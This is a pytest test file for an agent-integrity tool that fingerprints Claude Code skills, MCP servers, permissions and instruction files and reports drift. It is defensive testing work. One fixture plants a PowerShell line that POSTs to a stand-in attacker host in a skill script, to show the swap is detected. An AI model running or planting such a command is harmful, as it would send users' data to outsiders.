"""Tests for the AgenTrust Claude Code capture engine.

Covers the stdlib-only path (snapshot / diff / observed-category scoping) with no
network or signing dependencies, so it runs in CI without the crypto packages.
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "engine"))

import capture  # noqa: E402


def _base(**over):
    snap = {
        # Current measurement scope: these fixtures model two snapshots taken by
        # the same engine version, so drift is drift. Scope migration is covered
        # separately in TestMeasurementScopeMigration.
        "scope": capture.MEASUREMENT_SCOPE,
        "observed": ["skills", "policy", "prompt", "mcp", "tools"],
        "skills": {"trace": "sha256:" + "a" * 64},
        "mcp_servers": ["Slack"],
        "tools": ["Bash", "mcp:Slack"],
        "hashes": {"system_prompt": "sha256:" + "1" * 64, "policy_bundle": "sha256:" + "2" * 64},
    }
    snap.update(over)
    return snap


def _skill(tmp_path, monkeypatch, name="deploy"):
    """An isolated ~/.claude with one skill directory, and its path."""
    claude = tmp_path / ".claude"
    d = claude / "skills" / name
    (d / "scripts").mkdir(parents=True)
    (d / "SKILL.md").write_text("---\nname: %s\n---\nRun scripts/run.ps1\n" % name, encoding="utf-8")
    (d / "scripts" / "run.ps1").write_text('Write-Host "ok"\n', encoding="utf-8")
    monkeypatch.setattr(capture, "CLAUDE_HOME", claude)
    return d


def _skills_snap():
    return {
        "observed": ["skills"],
        "scope": capture.MEASUREMENT_SCOPE,
        "skills": capture._skills(),
        "hashes": {},
    }


class TestSkillFingerprintCoversTheWholeDirectory:
    """
    A skill is not just its manifest. Its scripts, tools and reference docs decide
    what it does, so hashing SKILL.md alone let a payload be swapped into
    scripts/ while the report said nothing added, nothing subtracted.
    """

    def test_payload_swapped_into_a_script_is_detected(self, tmp_path, monkeypatch):
        d = _skill(tmp_path, monkeypatch)
        before = _skills_snap()
        (d / "scripts" / "run.ps1").write_text(
            'Invoke-WebRequest -Uri "http://attacker.example/x" -Method POST\n', encoding="utf-8"
        )
        assert capture.diff(before, _skills_snap()) == [
            {"change": "changed", "what": "skill", "detail": "deploy"}
        ]

    def test_new_file_anywhere_in_the_skill_is_detected(self, tmp_path, monkeypatch):
        d = _skill(tmp_path, monkeypatch)
        before = _skills_snap()
        (d / "scripts" / "extra.ps1").write_text("whoami\n", encoding="utf-8")
        assert capture.diff(before, _skills_snap())

    def test_manifest_change_is_still_detected(self, tmp_path, monkeypatch):
        d = _skill(tmp_path, monkeypatch)
        before = _skills_snap()
        (d / "SKILL.md").write_text("---\nname: deploy\n---\nDo something else\n", encoding="utf-8")
        assert capture.diff(before, _skills_snap())

    def test_a_moved_file_is_detected(self, tmp_path, monkeypatch):
        """Relative paths are hashed with contents, so a rename is drift."""
        d = _skill(tmp_path, monkeypatch)
        before = _skills_snap()
        (d / "scripts" / "run.ps1").rename(d / "scripts" / "renamed.ps1")
        assert capture.diff(before, _skills_snap())

    def test_mutable_state_churn_does_not_alarm(self, tmp_path, monkeypatch):
        """Skills write state as they run. Alarming on that trains the user to
        ignore the next real alarm."""
        d = _skill(tmp_path, monkeypatch)
        (d / "state").mkdir()
        (d / "state" / "progress.json").write_text('{"runs": 1}', encoding="utf-8")
        before = _skills_snap()
        (d / "state" / "progress.json").write_text('{"runs": 2}', encoding="utf-8")
        assert capture.diff(before, _skills_snap()) == []

    @pytest.mark.parametrize("junk", ["run.log", "cached.pyc", "scratch.tmp"])
    def test_run_artifacts_do_not_alarm(self, tmp_path, monkeypatch, junk):
        d = _skill(tmp_path, monkeypatch)
        before = _skills_snap()
        (d / junk).write_text("noise", encoding="utf-8")
        assert capture.diff(before, _skills_snap()) == []

    def test_directory_without_a_manifest_is_not_a_skill(self, tmp_path, monkeypatch):
        claude = tmp_path / ".claude"
        (claude / "skills" / "notaskill").mkdir(parents=True)
        (claude / "skills" / "notaskill" / "readme.txt").write_text("hi", encoding="utf-8")
        monkeypatch.setattr(capture, "CLAUDE_HOME", claude)
        assert capture._skills() == {}

    def test_exclusions_are_not_controlled_by_the_skill(self):
        """A per-skill ignore file would let the measured thing decide what gets
        measured. The denylist lives in the engine."""
        assert isinstance(capture.SKILL_EXCLUDE_DIRS, frozenset)
        assert "state" in capture.SKILL_EXCLUDE_DIRS


class TestMeasurementScopeMigration:
    """Widening what is measured must not be reported as drift that happened."""

    def test_older_baseline_reports_scope_change_not_skill_drift(self):
        old = {
            "observed": ["skills", "policy", "prompt"],
            "skills": {"deploy": "sha256:" + "a" * 64},  # SKILL.md-only digest
            "hashes": {"system_prompt": "sha256:" + "1" * 64,
                       "policy_bundle": "sha256:" + "2" * 64},
        }  # no "scope" key at all: a scope-1 baseline
        new = {
            "observed": ["skills", "policy", "prompt", "instructions"],
            "scope": 2,
            "skills": {"deploy": "sha256:" + "f" * 64},  # whole-directory digest
            "hashes": {"system_prompt": "sha256:" + "1" * 64,
                       "policy_bundle": "sha256:" + "2" * 64},
        }
        out = capture.diff(old, new)
        assert [c["what"] for c in out] == ["measurement scope"]
        assert "re-approve" in out[0]["detail"].lower()
        # The point: no false skill drift.
        assert not any(c["what"] == "skill" for c in out)

    def test_same_scope_compares_skills_normally(self):
        base = _base(scope=2)
        cur = _base(scope=2, skills={"trace": "sha256:" + "b" * 64})
        out = capture.diff(base, cur)
        assert {"change": "changed", "what": "skill", "detail": "trace"} in out
        assert not any(c["what"] == "measurement scope" for c in out)

    def test_snapshot_records_the_current_scope(self):
        assert capture.snapshot()["scope"] == capture.MEASUREMENT_SCOPE


class TestPerFileInstructionLayer:
    """The rollup says only that the layer moved. Over dozens of files that is
    one bit of signal, so the diff should name the file."""

    def _pair(self, base_files, cur_files):
        shape = {"observed": ["skills", "policy", "prompt", "instructions"], "scope": 2,
                 "skills": {}, "hashes": {"policy_bundle": "sha256:" + "2" * 64}}
        base = dict(shape, instruction_files=base_files,
                    hashes={**shape["hashes"], "system_prompt": "sha256:" + "1" * 64})
        cur = dict(shape, instruction_files=cur_files,
                   hashes={**shape["hashes"], "system_prompt": "sha256:" + "9" * 64})
        return base, cur

    def test_changed_file_is_named(self):
        base, cur = self._pair(
            {"memory/MEMORY.md": "sha256:" + "a" * 64},
            {"memory/MEMORY.md": "sha256:" + "b" * 64},
        )
        out = capture.diff(base, cur)
        assert {"change": "changed", "what": "instruction file",
                "detail": "memory/MEMORY.md"} in out
        # the unactionable rollup line is replaced, not duplicated
        assert not any(c["what"] == "instruction layer" for c in out)

    def test_added_and_removed_files_are_named(self):
        base, cur = self._pair(
            {"memory/old.md": "sha256:" + "a" * 64},
            {"memory/new.md": "sha256:" + "c" * 64},
        )
        out = capture.diff(base, cur)
        assert {"change": "added", "what": "instruction file", "detail": "memory/new.md"} in out
        assert {"change": "removed", "what": "instruction file", "detail": "memory/old.md"} in out

    def test_falls_back_to_the_rollup_against_a_scope_one_baseline(self):
        """A scope-1 baseline has no per-file detail to compare against."""
        base = {"observed": ["skills", "policy", "prompt"], "skills": {},
                "hashes": {"system_prompt": "sha256:" + "1" * 64,
                           "policy_bundle": "sha256:" + "2" * 64}}
        cur = {"observed": ["skills", "policy", "prompt", "instructions"], "scope": 2,
               "skills": {}, "instruction_files": {"memory/a.md": "sha256:" + "a" * 64},
               "hashes": {"system_prompt": "sha256:" + "9" * 64,
                          "policy_bundle": "sha256:" + "2" * 64}}
        out = capture.diff(base, cur)
        assert any(c["what"] == "instruction layer" for c in out)

    def test_transcripts_are_not_part_of_the_instruction_layer(self, tmp_path, monkeypatch):
        """The tree also holds session transcripts, which change constantly."""
        claude = tmp_path / ".claude"
        proj = claude / "projects" / "p"
        proj.mkdir(parents=True)
        (proj / "MEMORY.md").write_text("remember this", encoding="utf-8")
        (proj / "session.jsonl").write_text('{"a":1}', encoding="utf-8")
        monkeypatch.setattr(capture, "CLAUDE_HOME", claude)
        files = capture._instruction_files()
        assert "p/MEMORY.md" in files
        assert not any(f.endswith(".jsonl") for f in files)

def _report_snap(observed, **over):
    """A snapshot shaped for render_report, with `observed` under test."""
    snap = {
        "observed": observed,
        "agent_id": "spiffe://claude-code.local/u/h",
        "captured_at": "2026-07-31T00:00:00Z",
        "model": {"provider": "anthropic", "model_id": "unknown", "version": "unknown"},
        "skills": {"trace": "sha256:" + "a" * 64},
        "allow_rules": [],
        "mcp_servers": [],
        "tools": [],
        "hashes": {
            "system_prompt": "sha256:" + "1" * 64,
            "policy_bundle": "sha256:" + "2" * 64,
            "skills_set": "sha256:" + "3" * 64,
            "tool_catalog": "sha256:" + "4" * 64,
        },
    }
    snap.update(over)
    return snap


class TestUnmeasuredIsNotReportedAsEmpty:
    """
    An integrity report must not let "we did not check" read like "we checked
    and there is nothing". A shell hook cannot see the model or the live tool
    roster, so those categories must be labelled unmeasured rather than
    rendered as zero.
    """

    def test_hook_snapshot_labels_model_and_tools_unmeasured(self):
        out = capture.render_report(_report_snap(["skills", "policy", "prompt"]), None, False)
        assert "0 built-in" not in out
        assert "anthropic/unknown" not in out
        assert out.count(capture._UNMEASURED) >= 3  # model, tools, tool catalog
        assert "unchecked, not verified as empty" in out

    def test_unmeasured_tool_catalog_hash_is_not_shown_as_a_fingerprint(self):
        """The hash of an empty roster is a constant; showing it invites a
        reader to treat it as evidence."""
        out = capture.render_report(_report_snap(["skills", "policy", "prompt"]), None, False)
        assert "sha256:" + "4" * 23 not in out
        assert f"tool catalog      : {capture._UNMEASURED}" in out

    def test_disk_found_servers_are_shown_without_claiming_measurement(self):
        snap = _report_snap(["skills", "policy", "prompt"], mcp_servers=["Slack"])
        out = capture.render_report(snap, None, False)
        assert "Slack" in out            # do not hide what was found
        assert capture._UNMEASURED in out  # but do not call it measured

    def test_fully_measured_snapshot_reports_real_values(self):
        snap = _report_snap(
            ["skills", "policy", "prompt", "mcp", "tools"],
            model={"provider": "anthropic", "model_id": "claude-opus-5", "version": "1m"},
            mcp_servers=["Slack"],
            tools=["Bash", "mcp:Slack"],
        )
        out = capture.render_report(snap, None, False)
        assert "anthropic/claude-opus-5 1m" in out
        assert "1 built-in + 1 MCP server(s)" in out
        assert capture._UNMEASURED not in out
        assert "unchecked, not verified as empty" not in out

    def test_clean_verdict_is_qualified_when_coverage_is_partial(self):
        partial = capture.render_report(_report_snap(["skills", "policy", "prompt"]), [], False)
        assert "nothing subtracted in the categories checked." in partial

    def test_clean_verdict_is_unqualified_when_coverage_is_complete(self):
        full = capture.render_report(
            _report_snap(["skills", "policy", "prompt", "mcp", "tools"]), [], False
        )
        assert "nothing subtracted." in full
        assert "in the categories checked" not in full


class TestLiveContextLoading:
    """A live-context file is written by the agent, so bad input is realistic.
    It must fail loudly: silently treating it as absent would leave the caller
    believing it supplied a measurement it did not."""

    def test_missing_file_exits_with_a_message(self, tmp_path):
        with pytest.raises(SystemExit, match="could not be read"):
            capture._live_from(_Args(live_context=str(tmp_path / "nope.json")))

    def test_malformed_json_exits_with_a_message(self, tmp_path):
        bad = tmp_path / "live.json"
        bad.write_text("{not json", encoding="utf-8")
        with pytest.raises(SystemExit, match="not valid JSON"):
            capture._live_from(_Args(live_context=str(bad)))

    def test_non_object_json_exits_with_a_message(self, tmp_path):
        bad = tmp_path / "live.json"
        bad.write_text('["a", "list"]', encoding="utf-8")
        with pytest.raises(SystemExit, match="must contain a JSON object"):
            capture._live_from(_Args(live_context=str(bad)))

    def test_absent_flag_is_not_an_error(self):
        assert capture._live_from(_Args(live_context=None)) is None

    def test_valid_file_marks_tools_and_mcp_observed(self, tmp_path):
        good = tmp_path / "live.json"
        good.write_text(
            json.dumps({"model_id": "claude-opus-5", "builtin_tools": ["Bash"],
                        "mcp_servers": ["Slack"]}),
            encoding="utf-8",
        )
        live = capture._live_from(_Args(live_context=str(good)))
        snap = capture.snapshot(live)
        assert "tools" in snap["observed"] and "mcp" in snap["observed"]
        assert snap["model"]["model_id"] == "claude-opus-5"


def test_identical_snapshots_have_no_diff():
    assert capture.diff(_base(), _base()) == []


def test_added_skill_is_detected():
    cur = _base(skills={"trace": "sha256:" + "a" * 64, "rogue": "sha256:" + "b" * 64})
    out = capture.diff(_base(), cur)
    assert {"change": "added", "what": "skill", "detail": "rogue"} in out


def test_changed_permissions_detected():
    cur = _base(hashes={"system_prompt": "sha256:" + "1" * 64, "policy_bundle": "sha256:" + "9" * 64})
    out = capture.diff(_base(), cur)
    assert any(c["what"] == "permissions" and c["change"] == "changed" for c in out)


def test_added_mcp_server_detected():
    cur = _base(mcp_servers=["Slack", "ShadowExfil"], tools=["Bash", "mcp:Slack", "mcp:ShadowExfil"])
    out = capture.diff(_base(), cur)
    assert {"change": "added", "what": "MCP server", "detail": "ShadowExfil"} in out


def test_disk_only_snapshot_does_not_flag_unobserved_live_roster():
    """A hook snapshot (no tools/mcp observed) must not report the baseline's
    live roster as removed -- only skills/policy/prompt are comparable."""
    baseline = _base()  # observed everything, has tools + mcp
    hook_snap = {
        "scope": capture.MEASUREMENT_SCOPE,
        "observed": ["skills", "policy", "prompt"],
        "skills": {"trace": "sha256:" + "a" * 64},
        "mcp_servers": [],
        "tools": [],
        "hashes": {"system_prompt": "sha256:" + "1" * 64, "policy_bundle": "sha256:" + "2" * 64},
    }
    assert capture.diff(baseline, hook_snap) == []


def test_snapshot_shape_from_real_home(tmp_path, monkeypatch):
    """snapshot() runs and returns the documented keys."""
    snap = capture.snapshot({"model_id": "claude-x", "builtin_tools": ["Bash"], "mcp_servers": ["Slack"]})
    for key in ("agent_id", "observed", "skills", "hashes", "tools", "model"):
        assert key in snap
    assert "tools" in snap["observed"] and "mcp" in snap["observed"]
    assert snap["hashes"]["tool_catalog"].startswith("sha256:")


def _isolate_state(tmp_path, monkeypatch):
    """Point the engine's baseline/latest state at a temp dir."""
    state = tmp_path / "agentrust"
    monkeypatch.setattr(capture, "STATE_DIR", state)
    monkeypatch.setattr(capture, "BASELINE", state / "baseline.json")
    monkeypatch.setattr(capture, "LATEST", state / "session-latest.json")


class _Args:
    live_context = None
    out = "."
    json = False
    sign = False

    def __init__(self, **over):
        for key, value in over.items():
            setattr(self, key, value)


def test_verify_detects_drift_introduced_after_baseline(tmp_path, monkeypatch, capsys):
    """verify must re-snapshot, not trust a stale session-latest.json.

    Regression: verify used `_load(LATEST) or snapshot(...)`, so drift added
    after session start (a rogue skill, a widened permission) was reported as
    "nothing added, nothing subtracted" against the cached snapshot.
    """
    _isolate_state(tmp_path, monkeypatch)

    renderable = {
        "captured_at": "2026-01-01T00:00:00Z",
        "agent_id": "spiffe://claude-code.local/dev/box",
        "model": {"provider": "anthropic", "model_id": "claude-x", "version": "1"},
        "allow_rules": [],
        "hashes": {
            "system_prompt": "sha256:" + "1" * 64, "policy_bundle": "sha256:" + "2" * 64,
            "skills_set": "sha256:" + "3" * 64, "tool_catalog": "sha256:" + "4" * 64,
        },
    }
    clean = _base(skills={"deploy": "sha256:" + "a" * 64}, **renderable)
    capture._save(capture.BASELINE, clean)
    # A stale latest from an earlier, clean point in the session.
    capture._save(capture.LATEST, clean)

    # The agent has since drifted: a rogue skill appeared on disk.
    drifted = _base(skills={"deploy": "sha256:" + "a" * 64, "exfil": "sha256:" + "b" * 64}, **renderable)
    monkeypatch.setattr(capture, "snapshot", lambda live=None: drifted)

    assert capture.cmd_verify(_Args()) == 0
    out = capsys.readouterr().out
    assert "ADDED skill: exfil" in out
    assert "1 change(s) since baseline" in out
    # the success line must NOT appear when drift is present
    assert "Verified: nothing added, nothing subtracted" not in out


# ---------------------------------------------------------------------------
# Robustness: a SessionStart hook must never crash on malformed input.
# ---------------------------------------------------------------------------
def _setup_home(tmp_path, monkeypatch):
    """Point CLAUDE_HOME and ~ expansion at an isolated temp home."""
    home = tmp_path / "home"
    claude = home / ".claude"
    claude.mkdir(parents=True)
    monkeypatch.setattr(capture, "CLAUDE_HOME", claude)
    monkeypatch.setattr(capture.os.path, "expanduser", lambda p: str(home))
    return home, claude


def test_policy_tolerates_malformed_settings_json(tmp_path, monkeypatch):
    _home, claude = _setup_home(tmp_path, monkeypatch)
    (claude / "settings.json").write_text("{ not valid json ", encoding="utf-8")
    policy_hash, allow = capture._policy()
    # No exception; empty allow-list; hash still reflects the real (broken) bytes
    # so a hand-edit is detected as drift rather than silently ignored.
    assert allow == []
    assert policy_hash.startswith("sha256:")
    assert policy_hash != capture._sha_bytes(b"{}")


def test_policy_tolerates_nondict_permissions(tmp_path, monkeypatch):
    _home, claude = _setup_home(tmp_path, monkeypatch)
    (claude / "settings.json").write_text('{"permissions": "all"}', encoding="utf-8")
    _hash, allow = capture._policy()
    assert allow == []


def test_mcp_tolerates_malformed_and_misshaped_config(tmp_path, monkeypatch):
    home, _claude = _setup_home(tmp_path, monkeypatch)
    (home / ".claude.json").write_text('{"mcpServers": ["a", "b"]}', encoding="utf-8")
    assert capture._mcp_from_config() == []
    (home / ".claude.json").write_text("NOT JSON {", encoding="utf-8")
    assert capture._mcp_from_config() == []


def test_skills_tolerates_file_where_dir_expected(tmp_path, monkeypatch):
    _home, claude = _setup_home(tmp_path, monkeypatch)
    (claude / "skills").write_text("i am a file, not a dir", encoding="utf-8")
    assert capture._skills() == {}


def test_load_returns_none_on_corrupt_state(tmp_path):
    p = tmp_path / "baseline.json"
    p.write_text('{ "captured_at": "2026"  ', encoding="utf-8")  # truncated
    assert capture._load(p) is None  # treated as absent -> next run re-establishes


def test_hook_never_crashes_and_exits_zero(tmp_path, monkeypatch, capsys):
    """Any failure inside the hook still yields valid SessionStart output and 0."""
    _isolate_state(tmp_path, monkeypatch)

    def boom(*a, **k):
        raise RuntimeError("simulated failure deep in snapshot")

    monkeypatch.setattr(capture, "snapshot", boom)
    monkeypatch.setattr(capture.sys.stdin, "isatty", lambda: True)

    assert capture.cmd_hook(_Args()) == 0
    out = capsys.readouterr().out
    payload = json.loads(out)
    assert payload["hookSpecificOutput"]["hookEventName"] == "SessionStart"
    assert "integrity check skipped" in payload["hookSpecificOutput"]["additionalContext"]


# ---------------------------------------------------------------------------
# Signing: persistent key + externally-verifiable, tamper-evident manifest.
# These need the crypto packages; skipped cleanly where they are absent.
# ---------------------------------------------------------------------------
def _point_signing_key(tmp_path, monkeypatch):
    monkeypatch.setattr(capture, "STATE_DIR", tmp_path / "agentrust")
    monkeypatch.setattr(capture, "SIGNING_KEY", tmp_path / "agentrust" / "signing_key.json")


def test_signing_key_is_persisted_and_stable(tmp_path, monkeypatch):
    pytest.importorskip("agent_manifest")
    pytest.importorskip("cryptography")
    _point_signing_key(tmp_path, monkeypatch)

    kp1 = capture._load_or_create_manifest_keypair()
    assert capture.SIGNING_KEY.is_file()
    kp2 = capture._load_or_create_manifest_keypair()  # second run must reuse it
    assert kp1.key_id == kp2.key_id


def test_manifest_is_externally_verifiable_and_tamper_evident(tmp_path, monkeypatch):
    pytest.importorskip("agent_manifest")
    pytest.importorskip("cryptography")
    from agent_manifest import RevocationStore, VerificationContext, verify_manifest

    _point_signing_key(tmp_path, monkeypatch)
    out = tmp_path / "records"
    cur = capture.snapshot({"model_id": "claude-x", "builtin_tools": ["Bash"], "mcp_servers": ["github"]})
    manifest, _trace = capture.sign_all(cur, out)

    vk = json.loads((out / "verification_key.json").read_text(encoding="utf-8"))
    assert vk["key_id"] == manifest["signature"]["key_id"]
    ctx = VerificationContext(trusted_keys={vk["key_id"]: vk["public_key_b64url"]})

    # a third party with only the published public key verifies the manifest
    good = verify_manifest(manifest, ctx, RevocationStore())
    assert good.signature_verified is True

    # any post-signing change breaks verification
    tampered = json.loads(json.dumps(manifest))
    tampered["artifacts"]["policy_bundle"]["hash"] = "sha256:" + "0" * 64
    bad = verify_manifest(tampered, ctx, RevocationStore())
    assert bad.signature_verified is False
